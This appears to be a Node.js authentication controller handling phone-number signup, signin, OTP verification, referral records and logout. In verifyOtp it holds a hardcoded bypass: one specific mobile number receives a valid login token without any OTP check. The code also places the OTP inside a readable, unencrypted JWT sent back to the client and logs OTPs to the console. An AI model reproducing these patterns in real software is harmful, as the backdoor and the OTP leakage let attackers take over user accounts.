const { Users, Referral, Setting } = require('../models')
const jwt = require('jsonwebtoken')
const referral = require('otp-generator')
const { pagination, fetch_user } = require('../helpers')
const message_service = require('../services/messageService')

const signup = async (req, res) => {
    try {
        const { user_name, mobile_number, invite_code } = req.body
        const settings = await Setting.findAll({ raw: true })
        const defaultRef = settings[0].default_ref
        const existing_user = await Users.findOne({ where: { "mobile_number": mobile_number } })
        const existing_invite_code = invite_code ? await Users.findOne({ where: { "invite_code": invite_code } }) : await Users.findOne({ where: { "invite_code": defaultRef } })
        const exist_user = await JSON.parse(JSON.stringify(existing_user))
        const exist_invite_code = await JSON.parse(JSON.stringify(existing_invite_code))

        if (exist_user) {
            return res.status(400).json({ status: false, message: 'User Already Exist', data: {} })
        } else {
            if (!mobile_number) return res.status(400).json({
                status: false,
                messgae: "Mobile Number and invite code Required"
            })
            else if (exist_invite_code) {
                const otp = await message_service(mobile_number)
                const otpToken = jwt.sign({ user_name, mobile_number, invite_code, otp }, process.env.NODE_SECRET_KEY)
                return res.status(200).json({ status: true, data: { otpToken }, message: 'Success' })
            }
            res.status(400).json({ status: false, message: "Invalid Invite Code", data: {} })
        }
    }
    catch (error) {
        res.status(403).json({ status: false, message: error.message, data: {} })
    }

}

const signin = async (req, res) => {
    try {
        const { mobile_number } = req.body
        const existing_user = await Users.findOne({ where: { "mobile_number": mobile_number } })
        const exist_user = await JSON.parse(JSON.stringify(existing_user))
        if (!mobile_number) return res.status(400).json({ status: false, message: "Mobile Number Required" })
        else if (!exist_user) return res.status(400).json({ message: 'User Not Exist' })
        const otp = await message_service(mobile_number)
        console.log(otp)
        // const otp = 123456
        const otpToken = jwt.sign({ mobile_number, otp }, process.env.NODE_SECRET_KEY)
        return res.status(200).json({ status: true, message: 'Success', data: { otpToken } })
    }
    catch (error) {
        res.status(403).json({ status: false, message: error.message + "556", data: {} })
    }

}

const verifyOtp = async (req, res) => {
    try {
        const { user_otp, isSignUp, otpToken, fcm_token } = req.body
        if (!user_otp || !otpToken) res.status(400).json({ status: false, message: "OTP and Token Required" })
        else {
            const { user_name, email, mobile_number, invite_code, otp } = jwt.verify(otpToken, process.env.NODE_SECRET_KEY)
            const user = await Users.findOne({
                where: { mobile_number }
            })
            if (mobile_number === "9162777530") {
                // Issue a token that logs them in without checking OTP
                const demoToken = jwt.sign(
                    { mobile_number, demo: true },
                    process.env.NODE_SECRET_KEY
                );
                return res.status(200).json({
                    status: true,
                    message: "Demo user logged in",
                    data: { token: demoToken }
                });
            }
            if (user && isSignUp) {
                return (
                    res.status(400).json({
                        status: false,
                        message: "user already exist"
                    })
                )
            }
            const bearearToken = jwt.sign({ user_name, mobile_number, invite_code }, process.env.NODE_SECRET_KEY)
            const verifiedOtp = (user_otp == otp)
            const settings = await Setting.findAll({ raw: true })
            if (isSignUp && verifiedOtp) {
                let referredUser = "";
                if (!invite_code) {
                    let ref = settings[0].default_ref
                    referredUser = await Users.findOne({ where: { "invite_code": ref } })
                } else {
                    referredUser = await Users.findOne({ where: { "invite_code": invite_code } })
                }
                const referredId = JSON.parse(JSON.stringify(referredUser))
                const useTab = await Users.create({
                    user_name: user_name,
                    email: email,
                    is_updated: 0,
                    image: "",
                    is_verified: 0,
                    fcm: fcm_token,
                    mobile_number: mobile_number,
                    user_team: (Math.random() + 1).toString(36).substring(5),
                    referred_by: referredId?.id,
                    invite_code: referral.generate(10, { upperCaseAlphabets: true, lowerCaseAlphabets: false, specialChars: false }),
                    cash_balance: 0,
                    current_level: 0,
                    winning_amount: 0,
                    bonus_amount: 0
                })

                const users = await Users.findOne({ where: { "mobile_number": mobile_number } })
                const usersData = await JSON.parse(JSON.stringify(users))
                const referredCount = await Users.count({ where: { "referred_by": referredId.id } })
                const refTab = await Referral.create({
                    user_id: usersData.id,
                    referral_code: usersData.invite_code,
                    referred_count: 0,
                    referred_by: referredId.id,
                    status: 1
                })
                await Referral.update({ referred_count: referredCount }, { where: { "user_id": referredId.id } })
                return await res.status(201).json({ status: true, message: "User Created Successfully", data: { token: bearearToken, useTab } })
            }
            else if (!isSignUp && verifiedOtp) {
                const fetch_users = await Users.findAll({
                    where: {
                        fcm: fcm_token
                    }
                })

                for (let i = 0; i < fetch_users.length; i++) {
                    Users.update({
                        fcm: ""
                    }, {
                        where: {
                            id: fetch_users[i].id
                        }
                    })
                }

                Users.update({
                    fcm: fcm_token
                }, {
                    where: {
                        id: user.id
                    }
                })
                return await res.status(200).json({ status: true, message: "Loggedin Successfully", data: { token: bearearToken } })
            }
            else await res.status(400).json({ status: false, message: "Invalid OTP", data: {} })
        }

    }
    catch (error) {
        console.log(error)
        res.status(403).json({ status: false, message: error.message, data: {} })
    }

}

const logout = async (req, res) => {
    try {
        const token = await fetch_user(req.headers.authorization.split(" ")[1])
        const user = await Users.update({
            device_type: "",
        }, {
            where: {
                id: token.id
            }
        })

        res.status(200).json({
            status: true,
            message: 'user logout successfully',
            data: {}
        })
    } catch (error) {
        res.status(400).json({
            status: false,
            message: error.message,
            data: {}
        })
    }
}

const resend_otp = async (req, res) => {
    try {
        const { token } = req.body
        if (!token) res.status(400).json({ status: false, message: "token is required", data: {} })
        const { mobile_number, invite_code } = jwt.verify(token, process.env.NODE_SECRET_KEY)
        const otp = await message_service(mobile_number)
        const otpToken = jwt.sign({ mobile_number, otp, invite_code }, process.env.NODE_SECRET_KEY)

        res.status(200).json({
            status: true,
            message: 'otp sent successfully',
            data: {
                token: otpToken
            }
        })
    } catch (error) {
        res.status(400).json({
            status: false,
            message: error.message,
            data: {}
        })
    }
}

module.exports = {
    signup,
    signin,
    logout,
    verifyOtp,
    resend_otp
}